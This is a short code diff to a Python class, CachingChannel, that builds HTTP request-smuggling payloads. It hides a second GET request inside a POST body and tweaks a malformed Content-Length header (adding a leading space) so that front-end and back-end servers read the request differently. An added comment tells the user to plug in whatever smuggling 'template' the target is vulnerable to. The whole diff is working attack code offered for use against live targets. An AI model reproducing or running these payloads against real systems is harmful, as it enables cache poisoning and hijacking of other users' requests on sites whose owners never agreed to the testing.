@@ -91,6 +91,12 @@ class CachingChannel(object):
         embedded_request = f"GET /deadaed{chunk}daedead HTTP/1.1\r\nX-YzBqv: "
         content_length = len(embedded_request.encode('utf-8'))
 
+
+        '''
+        This is where you will enter your own template as seen below. The below template is a generic nameprefix1 gadget -
+        but this will be whatever template your target is vulnerable to.
+        '''
+        
         http_request = (
             f"POST / HTTP/1.1\r\n"
             f"Host: {host.strip()}\r\n"
@@ -104,7 +110,7 @@ class CachingChannel(object):
             f"Via: null\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
             f"Foo: bar\r\n"
-            f"Content-Length x: {content_length}\r\n"
+            f" Content-Length: {content_length}\r\n"
             f"\r\n"
             f"{embedded_request}"
         )
